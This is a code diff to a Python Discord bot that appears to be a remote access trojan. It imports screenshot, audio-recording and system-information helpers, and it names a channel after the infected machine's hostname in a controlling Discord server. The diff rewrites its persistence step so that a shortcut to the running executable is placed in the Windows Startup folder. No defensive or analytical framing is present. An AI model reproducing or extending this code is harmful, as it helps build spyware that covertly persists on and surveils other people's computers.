@@ -2,9 +2,10 @@ import discord
 from discord.ext import commands
 import subprocess
 import os
+import sys
 from dotenv import load_dotenv
 from utils.setupshortcut import create_shortcut
-from config import TIME, VERSION, target_file, shortcut_file, help_text, home_path, hostname
+from config import TIME, VERSION, help_text, home_path, hostname
 from utils.splitter import split_string
 from utils.sysinfo import SystemInfo
 from utils.screenshot import get_screenshot
@@ -14,10 +15,14 @@ from utils.audio import record_audio
 # Load .env explicitly from engine directory
 load_dotenv(dotenv_path=os.path.join(os.path.dirname(__file__), ".env"))
 
+# Determine the current file (py or exe) and set the shortcut path
+current_file_path = sys.executable
+current_file = os.path.basename(current_file_path)  # Absolute path of the current script/exe
+shortcut_file = os.path.join(home_path, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", current_file.replace(".exe", ".lnk").replace(".py", ".lnk"))
 try:
-    create_shortcut(target_file, shortcut_file, description="My Shortcut")
-except:
-    pass
+    create_shortcut(current_file, shortcut_file, description="My Shortcut")
+except Exception as e:
+    print(f"[!] Failed to create shortcut: {e}")
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -29,9 +34,9 @@ async def ping(ctx):
 
 @bot.event
 async def on_ready():
-    guild_id = os.getenv("SERVER_ID")  # Use SERVER_ID as defined in .env
+    guild_id = os.getenv("SERVER_ID")
     if guild_id:
-        guild = bot.get_guild(int(guild_id))  # Convert to int as get_guild expects an int
+        guild = bot.get_guild(int(guild_id))
         if guild:
             existing_channel = discord.utils.get(guild.text_channels, name=hostname)
             if existing_channel:
